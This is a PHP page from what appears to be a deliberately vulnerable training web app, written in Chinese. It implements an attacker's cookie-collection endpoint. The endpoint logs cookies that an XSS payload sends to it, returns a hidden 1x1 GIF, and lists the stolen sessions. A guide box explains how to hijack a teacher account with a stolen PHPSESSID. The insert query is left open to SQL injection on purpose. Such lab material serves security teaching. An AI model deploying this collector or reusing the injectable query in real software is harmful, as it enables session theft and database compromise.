<?php
require_once __DIR__ . '/../src/db.php';
require_once __DIR__ . '/../src/helpers.php';
check_login();

// 1. 處理 Cookie 竊取寫入 (XSS Payload 呼叫)
if (isset($_GET['cookie'])) {
    $cookie_data = $_GET['cookie'];
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    try {
        // 弱點版直接字串拼接寫入
        $sql = "INSERT INTO stolen_cookies (cookie_data, ip_address, user_agent) VALUES ('$cookie_data', '$ip', '$ua')";
        $pdo->exec($sql);
    } catch (PDOException $e) {
        // 忽略寫入錯誤
    }

    // 回傳 1x1 透明 GIF 圖片避免 XSS 觸發時頁面壞掉或露出馬腳
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}

// 2. 處理清空收集箱
if (isset($_GET['action']) && $_GET['action'] === 'clear') {
    try {
        $pdo->exec("DELETE FROM stolen_cookies");
        header("Location: cookie_stealer.php?success=1");
        exit;
    } catch (PDOException $e) {
        $error = '清空失敗：' . $e->getMessage();
    }
}

// 3. 撈取所有被竊取的 Cookie
$stolen = [];
try {
    $stmt = $pdo->query("SELECT * FROM stolen_cookies ORDER BY id DESC");
    $stolen = $stmt->fetchAll();
} catch (PDOException $e) {
    $error = '撈取 Cookie 失敗：' . $e->getMessage();
}
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title>📋 攻擊者的 Cookie 收集箱 - VulnCampus</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
    <style>
        body { background-color: #0b0f19; color: #e2e8f0; padding-top: 50px; }
        .card { background-color: #111827; border: 1px solid #1f2937; border-radius: 12px; }
        .table { color: #e2e8f0; }
        .table th, .table td { border-color: #1f2937 !important; }
        .text-cookie { font-family: monospace; color: #38ef7d; word-break: break-all; }
    </style>
</head>
<body>

<div class="container mb-5">
    <div class="d-flex justify-content-between align-items-center mb-4 border-bottom pb-2">
        <h2>📋 攻擊者的 Cookie 收集箱 (Cookie Stealer)</h2>
        <div>
            <a href="?action=clear" class="btn btn-danger font-weight-bold" onclick="return confirm('確定要清空所有被竊取的 Cookie 嗎？')">🗑️ 清空收集箱</a>
            <a href="/index.php" class="btn btn-secondary">回首頁</a>
        </div>
    </div>

    <?php if (isset($_GET['success'])): ?>
        <div class="alert alert-success">收集箱已成功清空！</div>
    <?php endif; ?>
    <?php if (isset($error)): ?>
        <div class="alert alert-danger"><?= $error ?></div>
    <?php endif; ?>

    <div class="alert alert-info">
        💡 <strong>XSS ➡ Cookie 竊取 ➡ 會話劫持 演練指引：</strong><br>
        1. <strong>運作原理</strong>：當網站存有 XSS 漏洞時，攻擊者可插入 JavaScript 讀取使用者的 <code>document.cookie</code>。若後端設定 Session Cookie 時<strong>未啟用 HttpOnly</strong>，惡意腳本就能順利將該 Session ID 傳送到此竊取收集箱。<br>
        2. <strong>測試步驟</strong>：<br>
           &nbsp;&nbsp;&nbsp;&nbsp;a. 前往留言板（<code>/xss_stored.php</code>），填入竊取腳本留言送出。<br>
           &nbsp;&nbsp;&nbsp;&nbsp;b. 隨意切換使用者（如用另一台電腦或無痕視窗登入 <code>teacher01</code> 瀏覽該留言板）。<br>
           &nbsp;&nbsp;&nbsp;&nbsp;c. 重新整理本頁面，您會看見 <code>teacher01</code> 的 Session Cookie 被即時記錄在下方列表中。<br>
           &nbsp;&nbsp;&nbsp;&nbsp;d. 學生可使用瀏覽器 Cookie 編輯插件（如 EditThisCookie），將自己的 <code>PHPSESSID</code> 改為被竊取的值，即可在「不需要知道對方帳密」的情況下，直接以對方身分登入！
    </div>

    <div class="card shadow-sm p-4">
        <h4 class="text-warning mb-3">被竊取的 Cookie 列表</h4>
        <table class="table table-bordered table-striped">
            <thead class="thead-dark">
                <tr>
                    <th>時間</th>
                    <th>來源 IP</th>
                    <th>竊取到的 Cookie 資料 (document.cookie)</th>
                    <th>使用者瀏覽器 (User-Agent)</th>
                </tr>
            </thead>
            <tbody>
                <?php if (empty($stolen)): ?>
                    <tr><td colspan="4" class="text-center text-muted">目前暫無被竊取的 Cookie，請先在留言板觸發 XSS 攻擊！</td></tr>
                <?php else: ?>
                    <?php foreach ($stolen as $row): ?>
                        <tr>
                            <td><?= htmlspecialchars($row['created_at']) ?></td>
                            <td><code><?= htmlspecialchars($row['ip_address']) ?></code></td>
                            <td class="text-cookie"><?= htmlspecialchars($row['cookie_data']) ?></td>
                            <td class="small text-muted"><?= htmlspecialchars($row['user_agent']) ?></td>
                        </tr>
                    <?php endforeach; ?>
                <?php endif; ?>
            </tbody>
        </table>
    </div>
</div>

</body>
</html>
